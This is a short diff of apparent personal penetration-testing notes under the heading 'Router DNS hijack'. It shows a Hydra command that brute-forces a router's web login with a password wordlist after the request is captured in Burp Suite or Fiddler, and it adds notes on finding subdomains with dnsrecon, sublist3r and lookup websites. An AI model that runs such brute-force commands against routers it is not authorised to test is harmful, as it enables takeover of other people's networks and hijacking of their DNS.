@@ -28,13 +28,24 @@ Router DNS hijack
  
   #fiddler  or burbsuite // get the bloew sting and use HYDRA
   #hydra -l "" -P "/usr/sahre/wordlist/pass.txt" 192.154.1.1 http-post-form "/cgi-bin/webproc:%3Ausername=^USER^&%3Apassword=^PASS^&%3Aaction=Login;H=Cookie: %3Asessionid=68b3e673"
-  
-  
-  
-  
+ 
+}
 
+Finding Subdomains
+-------------------
+{
+#dnsrecon -d yourdomain.com
+
+Website : DNSDumpster, nmmapper , spyse , netcraft
+
+sublist3r
+{
+  ./sublist3r.py -d uourdomain.com
+}
+
+
+  
 
 
 }
-
 
